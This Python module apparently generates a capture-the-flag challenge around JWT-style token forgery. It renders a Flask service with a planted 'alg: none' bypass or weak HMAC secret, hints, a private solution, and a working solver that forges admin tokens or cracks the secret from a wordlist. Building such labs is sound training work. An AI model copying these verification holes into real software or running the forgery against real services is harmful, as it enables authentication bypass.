"""Deterministic renderer for the ``crypto_token_forgery`` challenge family.

A web app issues signed session tokens for a lightweight admin console, and its
hand-rolled verifier contains a token-forgery flaw. Which flaw varies PER
INSTANCE (seed-derived), so a writeup or one-shot LLM prompt built from one
instance does NOT generalise to another:

* ``alg_none`` -- the verifier honours a legacy ``alg: none`` debug path, so an
  unsigned token is accepted with no signature check (classic none-algorithm
  bypass). Solve: forge an unsigned admin token.
* ``weak_secret`` -- tokens are properly HS256-verified (no none path), but the
  signing secret is a weak, guessable value. Solve: recover the secret with a
  dictionary attack against an observed token, then sign a valid admin token.

Both are CWE-347 (improper verification of a cryptographic signature) but need
DIFFERENT attacker techniques: an ``alg: none`` writeup fails outright on a
``weak_secret`` instance (which rejects unsigned tokens), and a cracking
writeup fails on an ``alg_none`` instance (whose secret is strong and
uncrackable). The private solver is adaptive -- it discovers which flaw the
live instance has and applies the matching technique -- so it solves any
instance (and any sibling) while a single-technique human/AI writeup does not.

This module is intentionally standalone: it must NOT import ``families``
(which imports it) to avoid a circular import. It exports the fixed
renderer-module interface that ``families.py`` wires up.
"""

from __future__ import annotations

import json
import random
from dataclasses import dataclass
from typing import TYPE_CHECKING

from ctf_generator.models import ChallengeSpec
from ctf_generator.yaml_writer import dump_yaml

if TYPE_CHECKING:
    from ctf_generator.cve_source import CveRecord

# --- Renderer-module interface (see families.py FamilyRenderer contract) -----

FAMILY_NAME = "crypto_token_forgery"
CATEGORY = "crypto"
MODES: tuple[str, ...] = ("red",)
DIFFICULTIES: tuple[str, ...] = ("easy", "medium", "hard")
CVE_DRIVEN = True
LLM_BRIEF = (
    "A web console issues HMAC-signed session tokens and its hand-rolled "
    "verifier has a token-forgery flaw that varies per instance (CWE-347): "
    "either a legacy 'alg: none' bypass (forge an unsigned admin token) or a "
    "weak, guessable signing secret (crack it, then sign a valid admin token). "
    "The player reaches a protected admin endpoint holding the flag."
)
COMPOSE_MARKERS: tuple[str, ...] = ("api:",)
SCORING_HINTS: dict[str, object] = {
    "has_worker": False,
    "has_queue": False,
    "live_interaction": True,
    "decoy_density": "medium",
}
REQUIRED_FILES: tuple[str, ...] = (
    "challenge.yaml",
    "docker-compose.yml",
    "services/api/Dockerfile",
    "services/api/requirements.txt",
    "services/api/app.py",
    "public/description.md",
    "public/hints.yaml",
    "private/solution.md",
    "private/solver.py",
    "private/variant.json",
    "private/checkpoints.yaml",
    "tests/healthcheck.py",
)

# The per-instance vulnerability classes this family rotates between.
VULN_CLASSES: tuple[str, ...] = ("alg_none", "weak_secret")

# Weak signing secrets used by ``weak_secret`` instances. The solver ships this
# exact list as its crack dictionary, so a ``weak_secret`` instance is always
# solvable by the reference solver -- but the secret is never disclosed to a
# player, who must actually run the dictionary attack.
_WEAK_SECRETS: tuple[str, ...] = (
    "hunter2",
    "letmein",
    "password1",
    "admin123",
    "changeme",
    "qwerty123",
    "dragon123",
    "monkey99",
    "summer2020",
    "trustno1",
    "iloveyou1",
    "superman7",
    "baseball7",
    "shadow2019",
)


@dataclass(frozen=True)
class Variant:
    vuln_class: str
    login_noun: str
    admin_noun: str
    whoami_noun: str
    issuer: str
    demo_user: str
    demo_password: str
    admin_user: str
    secret: str
    flag: str


def render(
    spec: ChallengeSpec,
    rng: random.Random,
    cve_record: "CveRecord | None" = None,
) -> dict[str, str]:
    variant = _variant(rng)
    login_route = f"/api/{variant.login_noun}"
    whoami_route = f"/api/{variant.whoami_noun}"
    admin_route = f"/api/admin/{variant.admin_noun}"

    files = {
        "docker-compose.yml": _compose(),
        "services/api/Dockerfile": _dockerfile(),
        "services/api/requirements.txt": "flask==3.0.3\n",
        "services/api/app.py": _api_app(variant, login_route, whoami_route, admin_route),
        "public/description.md": _description(
            spec, variant, login_route, whoami_route, admin_route, cve_record
        ),
        "public/hints.yaml": dump_yaml({"hints": _hints(variant, admin_route)}),
        "private/solution.md": _solution(variant, login_route, whoami_route, admin_route),
        "private/solver.py": _solver(variant, login_route, admin_route),
        "private/variant.json": _variant_json(spec, variant, login_route, whoami_route, admin_route),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "tests/healthcheck.py": _healthcheck(),
    }
    return files


def _variant(rng: random.Random) -> Variant:
    # Drawn FIRST so the vulnerability class is a stable, seed-derived property
    # of the instance (and the rest of the stream stays deterministic per seed).
    vuln_class = rng.choice(VULN_CLASSES)
    login_noun = rng.choice(["login", "session", "auth", "signin"])
    admin_noun = rng.choice(["reports", "dashboard", "console", "ledger"])
    whoami_noun = rng.choice(["whoami", "profile", "me"])
    issuer = rng.choice(["Northwind Portal", "Aurora Ops", "Cobalt Suite", "Vantage Console"])
    demo_user = rng.choice(["guest", "intern", "analyst", "viewer"])
    demo_password = (
        f"{rng.choice(['Spring', 'River', 'Delta', 'Ember'])}{rng.randrange(100, 999)}!"
    )
    admin_user = rng.choice(["root_admin", "sysadmin", "superuser", "admin_ops"])
    if vuln_class == "weak_secret":
        secret = rng.choice(_WEAK_SECRETS)
        flag = f"ctf{{jwt_weak_secret_{_token_hex(rng, 6)}}}"
    else:
        secret = _token_hex(rng, 16)
        flag = f"ctf{{jwt_none_alg_{_token_hex(rng, 6)}}}"
    return Variant(
        vuln_class=vuln_class,
        login_noun=login_noun,
        admin_noun=admin_noun,
        whoami_noun=whoami_noun,
        issuer=issuer,
        demo_user=demo_user,
        demo_password=demo_password,
        admin_user=admin_user,
        secret=secret,
        flag=flag,
    )


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _vuln_label(vuln_class: str) -> str:
    return {
        "alg_none": "alg=none signature-check bypass (CWE-347)",
        "weak_secret": "weak/guessable HMAC signing secret (CWE-347)",
    }[vuln_class]


def _variant_json(
    spec: ChallengeSpec, v: Variant, login_route: str, whoami_route: str, admin_route: str
) -> str:
    return json.dumps(
        {
            "meta": spec.meta_mapping(),
            "family": FAMILY_NAME,
            "flag": v.flag,
            "vuln_class": v.vuln_class,
            "routes": {
                "health": "/healthz",
                "login": login_route,
                "whoami": whoami_route,
                "admin": admin_route,
            },
            "credentials": {
                "demo_user": v.demo_user,
                "demo_password": v.demo_password,
                "admin_user": v.admin_user,
            },
            "token": {
                "issuer": v.issuer,
                "secret": v.secret,
                "vulnerability": _vuln_label(v.vuln_class),
            },
        },
        indent=2,
        sort_keys=True,
    ) + "\n"


def _compose() -> str:
    return """services:
  api:
    build: ./services/api
    environment:
      CTFGEN_FLAG: ${CTFGEN_FLAG:-}
      TOKEN_SECRET: ${TOKEN_SECRET:-}
    ports:
      - "8080:8080"
    networks: [frontend]
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 256m
    pids_limit: 128

networks:
  frontend:
"""


def _dockerfile() -> str:
    return """FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
CMD ["python", "app.py"]
"""


def _decode_token_body(vuln_class: str) -> str:
    """The vulnerable ``decode_token`` body for this instance's class."""
    if vuln_class == "alg_none":
        return '''    alg = str(header.get("alg", "")).lower()
    if alg == "none":
        # VULNERABILITY (CWE-347): a legacy 'alg: none' debug path accepts a
        # token with NO signature check at all. It predates the current auth
        # stack and was never removed.
        return payload

    if alg != "hs256":
        return None

    signing_input = f"{header_seg}.{payload_seg}".encode("ascii")
    expected = hmac.new(SECRET.encode("utf-8"), signing_input, hashlib.sha256).digest()
    try:
        actual = _b64url_decode(sig_seg)
    except Exception:
        return None
    if not hmac.compare_digest(expected, actual):
        return None
    return payload'''
    # weak_secret: strict HS256 verification only -- but SECRET is guessable.
    return '''    alg = str(header.get("alg", "")).lower()
    # No 'alg: none' path here: unsigned tokens are rejected. The verification
    # itself is correct -- the VULNERABILITY (CWE-347) is that SECRET is a
    # weak, guessable value an attacker can recover by a dictionary attack.
    if alg != "hs256":
        return None

    signing_input = f"{header_seg}.{payload_seg}".encode("ascii")
    expected = hmac.new(SECRET.encode("utf-8"), signing_input, hashlib.sha256).digest()
    try:
        actual = _b64url_decode(sig_seg)
    except Exception:
        return None
    if not hmac.compare_digest(expected, actual):
        return None
    return payload'''


def _api_app(v: Variant, login_route: str, whoami_route: str, admin_route: str) -> str:
    decode_body = _decode_token_body(v.vuln_class)
    return f'''from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import time

from flask import Flask, jsonify, request

app = Flask(__name__)

FLAG = os.environ.get("CTFGEN_FLAG") or "{v.flag}"
SECRET = os.environ.get("TOKEN_SECRET") or "{v.secret}"
ISSUER = "{v.issuer}"

USERS = {{
    "{v.demo_user}": {{"password": "{v.demo_password}", "role": "user"}},
    # No self-service login exists for the admin account; its password is
    # rotated out-of-band by ops and is not present anywhere in this service.
    "{v.admin_user}": {{"password": None, "role": "admin"}},
}}


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(text: str) -> bytes:
    padding = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + padding)


def issue_token(username: str, role: str) -> str:
    header = {{"alg": "HS256", "typ": "JWT"}}
    payload = {{
        "sub": username,
        "role": role,
        "iss": ISSUER,
        "iat": int(time.time()),
    }}
    header_seg = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_seg = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{{header_seg}}.{{payload_seg}}".encode("ascii")
    signature = hmac.new(SECRET.encode("utf-8"), signing_input, hashlib.sha256).digest()
    sig_seg = _b64url_encode(signature)
    return f"{{header_seg}}.{{payload_seg}}.{{sig_seg}}"


def decode_token(token: str):
    """Return the payload dict for a valid token, else None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header_seg, payload_seg, sig_seg = parts
    try:
        header = json.loads(_b64url_decode(header_seg))
        payload = json.loads(_b64url_decode(payload_seg))
    except Exception:
        return None

{decode_body}


def current_payload():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None
    return decode_token(auth[len("Bearer "):].strip())


@app.get("/healthz")
def healthz():
    return {{"ok": True, "service": "api"}}


@app.post("{login_route}")
def login():
    body = request.get_json(force=True, silent=True) or {{}}
    username = str(body.get("username", ""))
    password = str(body.get("password", ""))
    user = USERS.get(username)
    if user is None or user["password"] is None or user["password"] != password:
        return jsonify({{"error": "invalid credentials"}}), 401
    token = issue_token(username, user["role"])
    return jsonify({{"token": token, "role": user["role"]}})


@app.get("{whoami_route}")
def whoami():
    payload = current_payload()
    if payload is None:
        return jsonify({{"error": "unauthenticated"}}), 401
    return jsonify({{"sub": payload.get("sub"), "role": payload.get("role")}})


@app.get("{admin_route}")
def admin_panel():
    payload = current_payload()
    if payload is None or payload.get("role") != "admin":
        return jsonify({{"error": "forbidden"}}), 403
    return jsonify({{"panel": f"{{ISSUER}} admin console", "flag": FLAG}})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
'''


def _hints(v: Variant, admin_route: str) -> list[dict]:
    hints = [
        {
            "level": 1,
            "text": (
                "Log in and inspect the token you get back. It has the "
                "familiar three dot-separated segments of a signed token."
            ),
        },
        {
            "level": 2,
            "text": (
                "Decode the header and payload segments (base64url). The server "
                "verifies this token by hand -- look for what it trusts that it "
                "shouldn't, either in the header it reads or the key it signs with."
            ),
        },
    ]
    if v.vuln_class == "alg_none":
        level3 = (
            f"The verifier still accepts an 'alg: none' legacy debug token with "
            f"an empty signature segment. Forge a payload claiming the "
            f"'{v.admin_user}' identity and role 'admin', then call {admin_route}."
        )
    else:
        level3 = (
            f"Unsigned tokens are rejected -- the signature is genuinely checked. "
            f"But the HMAC secret is weak: recover it with a dictionary attack "
            f"against your own login token, then sign an admin token (sub "
            f"'{v.admin_user}', role 'admin') and call {admin_route}."
        )
    hints.append({"level": 3, "text": level3})
    return hints


def _description(
    spec: ChallengeSpec,
    v: Variant,
    login_route: str,
    whoami_route: str,
    admin_route: str,
    cve_record: "CveRecord | None",
) -> str:
    cve_note = ""
    if cve_record is not None:
        cve_note = (
            f"\nThis challenge is themed after the broader class of "
            f"cryptographic-verification failures illustrated by "
            f"{cve_record.cve_id} ({cve_record.cvss_severity.title()}, "
            f"{', '.join(cve_record.cwe_ids) or 'unclassified CWE'}): "
            f"{cve_record.description}\n"
        )
    return f"""# {spec.title}

You have access to the `{v.issuer}` admin console API as a low-privilege
demo account.

Credentials:

- `POST {login_route}` with `{{"username": "{v.demo_user}", "password": "{v.demo_password}"}}`

The login response includes a session token. Somewhere in how that token is
verified, the server trusts more than it should. Your goal is to reach the
admin-only endpoint and recover the flag -- without ever knowing the admin
account's password.

Useful routes:

- `GET /healthz`
- `POST {login_route}`
- `GET {whoami_route}` (send `Authorization: Bearer <token>`)
- `GET {admin_route}` (admin-only)

The flag format is `ctf{{...}}`.
{cve_note}
This challenge is generated as a crypto variant. The exact token-verification
flaw, route names, usernames, issuer name, and secret differ across generated
instances -- a technique that works on one instance may not work on another.
"""


def _solution(v: Variant, login_route: str, whoami_route: str, admin_route: str) -> str:
    if v.vuln_class == "alg_none":
        specific = f"""This instance's flaw is a legacy `alg: none` bypass: any token whose header
declares `"alg": "none"` is accepted with **no signature check at all**.

Solve path:

1. `POST {login_route}` with `{{"username": "{v.demo_user}", "password": "{v.demo_password}"}}`
   and capture the returned token.
2. Base64url-decode the token's header and payload segments.
3. Rewrite the header to `{{"alg": "none", "typ": "JWT"}}`.
4. Rewrite the payload's `sub` to `"{v.admin_user}"` and `role` to `"admin"`.
5. Re-encode both segments and join them with a **trailing empty signature
   segment**: `<header>.<payload>.`
6. `GET {admin_route}` with `Authorization: Bearer <forged token>`."""
    else:
        specific = f"""This instance's flaw is a **weak signing secret**: the verifier correctly
checks the HS256 signature (an `alg: none` token is rejected), but the secret
is a guessable value, so it can be recovered by a dictionary attack.

Solve path:

1. `POST {login_route}` with `{{"username": "{v.demo_user}", "password": "{v.demo_password}"}}`
   and capture the returned token.
2. Recover the HMAC secret: for each candidate word, recompute
   `HMAC-SHA256(word, "<header>.<payload>")` and compare it to the token's
   signature segment. The match is the real secret (`"{v.secret}"`).
3. Build an admin payload (`sub` = `"{v.admin_user}"`, `role` = `"admin"`) and
   sign it with the recovered secret as a normal HS256 token.
4. `GET {admin_route}` with `Authorization: Bearer <signed token>`."""
    return f"""# Private Solution

The token verifier is a hand-rolled JWT-style implementation with a
CWE-347 signature-verification flaw. **Which** flaw varies per instance, so
this write-up is specific to this instance (`vuln_class = {v.vuln_class}`).

{specific}

The reference solver (`private/solver.py`) is adaptive: it tries the
`alg: none` forgery first and falls back to a dictionary attack, so it solves
any instance of this family regardless of its class. The lesson is that a
verifier must pin its algorithm server-side AND use a strong, secret key --
neither the algorithm nor the key may be trusted from attacker-reachable data.
"""


def _solver(v: Variant, login_route: str, admin_route: str) -> str:
    wordlist = ", ".join(f'"{w}"' for w in _WEAK_SECRETS)
    return f'''from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
from urllib import request
from urllib.error import HTTPError

# Dictionary used to recover a weak HMAC secret (weak_secret instances).
WORDLIST = [{wordlist}]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(text: str) -> bytes:
    padding = "=" * (-len(text) % 4)
    return base64.urlsafe_b64decode(text + padding)


def _sign_hs256(payload: dict, secret: str) -> str:
    header_seg = _b64url_encode(
        json.dumps({{"alg": "HS256", "typ": "JWT"}}, separators=(",", ":")).encode("utf-8")
    )
    payload_seg = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{{header_seg}}.{{payload_seg}}".encode("ascii")
    sig = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return f"{{header_seg}}.{{payload_seg}}.{{_b64url_encode(sig)}}"


def _forge_alg_none(payload: dict) -> str:
    header_seg = _b64url_encode(
        json.dumps({{"alg": "none", "typ": "JWT"}}, separators=(",", ":")).encode("utf-8")
    )
    payload_seg = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    return f"{{header_seg}}.{{payload_seg}}."


def _crack_secret(token: str) -> str | None:
    header_seg, payload_seg, sig_seg = token.split(".")
    signing_input = f"{{header_seg}}.{{payload_seg}}".encode("ascii")
    want = _b64url_decode(sig_seg)
    for candidate in WORDLIST:
        got = hmac.new(candidate.encode("utf-8"), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(got, want):
            return candidate
    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--username", default="{v.demo_user}")
    parser.add_argument("--password", default="{v.demo_password}")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    def post_json(path, payload):
        req = request.Request(
            base + path,
            data=json.dumps(payload).encode("utf-8"),
            headers={{"Content-Type": "application/json"}},
            method="POST",
        )
        with request.urlopen(req, timeout=5) as response:
            return json.loads(response.read().decode("utf-8"))

    def get(path, headers=None):
        req = request.Request(base + path, headers=headers or {{}})
        try:
            with request.urlopen(req, timeout=5) as response:
                return response.status, response.read().decode("utf-8")
        except HTTPError as exc:
            return exc.code, exc.read().decode("utf-8")

    login = post_json("{login_route}", {{"username": args.username, "password": args.password}})
    token = login["token"]

    header_seg, payload_seg, _sig_seg = token.split(".")
    payload = json.loads(_b64url_decode(payload_seg))
    payload["sub"] = "{v.admin_user}"
    payload["role"] = "admin"

    # Adaptive: try each forgery technique until the admin route yields the flag.
    candidates = [_forge_alg_none(payload)]
    secret = _crack_secret(token)
    if secret is not None:
        candidates.append(_sign_hs256(payload, secret))

    for forged in candidates:
        status, body = get("{admin_route}", headers={{"Authorization": f"Bearer {{forged}}"}})
        if status == 200:
            match = re.search(r"ctf\\{{[^}}]+\\}}", body)
            if match:
                print(match.group(0))
                return 0

    raise RuntimeError("no forgery technique recovered the flag")


if __name__ == "__main__":
    sys.exit(main())
'''


def _healthcheck() -> str:
    return '''from __future__ import annotations

import argparse
import json
import sys
from urllib import request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    args = parser.parse_args()
    with request.urlopen(args.base_url.rstrip("/") + "/healthz", timeout=5) as response:
        body = json.loads(response.read().decode("utf-8"))
    assert body["ok"] is True
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''
